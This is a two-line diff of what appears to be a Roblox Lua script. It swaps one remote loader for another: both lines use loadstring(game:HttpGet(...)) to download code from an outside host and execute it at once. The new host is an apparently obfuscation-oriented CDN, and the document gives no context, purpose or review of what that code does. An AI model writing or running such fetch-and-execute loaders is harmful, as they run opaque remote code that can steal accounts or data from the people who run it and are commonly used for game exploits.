@@ -1,2 +1,1 @@
-
-loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=1378361431100"))("1378361431100")
+loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/2bf8f9/HLNVkSVt0YgATkPq"))()
